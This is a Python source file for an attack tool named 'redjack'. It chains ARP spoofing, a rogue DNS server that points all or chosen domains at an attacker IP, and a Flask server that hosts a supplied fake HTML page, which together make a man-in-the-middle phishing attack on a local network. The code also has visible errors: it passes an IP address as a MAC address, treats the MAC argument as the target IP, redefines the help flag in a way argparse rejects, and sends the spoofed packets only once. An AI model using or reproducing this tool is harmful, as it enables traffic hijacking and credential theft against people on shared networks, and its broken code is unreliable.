import argparse
import os
import sys
import time
import socket
import threading
from scapy.all import ARP, send, sniff
from dnslib import DNSRecord, QTYPE, RR, A
from flask import Flask
import subprocess

app = Flask(__name__)

TARGET_IP = None
GATEWAY_IP = None
REDIRECT_IP = None
HTML_FILE = None
DURATION = None
DOMAIN = "*"
INTERFACE = None
VERBOSE = False

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.254.254', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def get_mac_address(ip):
    result = os.popen(f"arp -n {ip}").read()
    for line in result.splitlines():
        if ip in line:
            return line.split()[3]
    return None

def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac_address(target_ip)
    if target_mac is None:
        print(f"Error: Could not find target MAC address for {target_ip}")
        return
    packet_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=get_local_ip())
    packet_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=get_local_ip())
    send(packet_target, verbose=False)
    send(packet_gateway, verbose=False)
    print(f"[+] ARP spoofing {target_ip} -> {gateway_ip} and vice versa")

def dns_spoof():
    from socketserver import UDPServer, BaseRequestHandler
    class DNSHandler(BaseRequestHandler):
        def handle(self):
            data = self.request[0]
            sock = self.request[1]
            dns_record = DNSRecord.parse(data)
            qname = str(dns_record.q.qname)
            reply = DNSRecord(dns_record)
            if DOMAIN in qname or DOMAIN == "*":
                reply.add_answer(RR(qname, QTYPE.A, rdata=A(REDIRECT_IP), ttl=10))
                if VERBOSE:
                    print(f"[+] Spoofed DNS response for {qname} -> {REDIRECT_IP}")
            sock.sendto(reply.pack(), self.client_address)
    print(f"[*] Starting DNS spoofing on port 53...")
    UDPServer(("0.0.0.0", 53), DNSHandler).serve_forever()

def start_fake_server():
    @app.route('/')
    def index():
        with open(HTML_FILE, 'r') as f:
            return f.read()
    print(f"[*] Hosting fake website from {HTML_FILE}")
    app.run(host="0.0.0.0", port=80, use_reloader=False)

def parse_arguments():
    parser = argparse.ArgumentParser(prog="redjack", description="Network redirection tool using ARP + DNS spoofing.")
    parser.add_argument("-m", "--mac", help="Target MAC address (optional, auto-detected if omitted)")
    parser.add_argument("-ip", "--redirect-ip", help="Redirect IP for DNS spoofing (default: local IP)")
    parser.add_argument("-html", help="Path to HTML file to serve", required=True)
    parser.add_argument("-d", "--duration", type=int, help="Duration in seconds to run (default: until Ctrl+C)", default=None)
    parser.add_argument("-dom", "--domain", help="Domain to spoof (default: * for all)", default="*")
    parser.add_argument("--interface", help="Network interface to use (default: auto-detect)", default=None)
    parser.add_argument("--verbose", action="store_true", help="Show logs for DNS and ARP spoofing activity")
    parser.add_argument("-h", "--help", action="help", help="Show this help message and exit")
    args = parser.parse_args()
    return args

def main():
    args = parse_arguments()
    global TARGET_IP, GATEWAY_IP, REDIRECT_IP, HTML_FILE, DURATION, DOMAIN, INTERFACE, VERBOSE
    TARGET_IP = args.mac if args.mac else None
    HTML_FILE = args.html
    DURATION = args.duration
    DOMAIN = args.domain
    INTERFACE = args.interface
    VERBOSE = args.verbose
    REDIRECT_IP = args.redirect_ip if args.redirect_ip else get_local_ip()
    if TARGET_IP is None:
        print("[!] Target IP not specified. Please provide one.")
        sys.exit(1)
    GATEWAY_IP = os.popen(f"ip route | grep default | awk '{{print $3}}'").read().strip()
    if not GATEWAY_IP:
        print("[!] Could not detect gateway IP.")
        sys.exit(1)
    spoof_thread = threading.Thread(target=arp_spoof, args=(TARGET_IP, GATEWAY_IP))
    dns_thread = threading.Thread(target=dns_spoof)
    flask_thread = threading.Thread(target=start_fake_server)
    spoof_thread.start()
    dns_thread.start()
    flask_thread.start()
    if DURATION:
        time.sleep(DURATION)
        print(f"[*] Duration {DURATION} seconds reached. Stopping...")
        sys.exit(0)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Stopping redjack...")
        sys.exit(0)

if __name__ == "__main__":
    main()
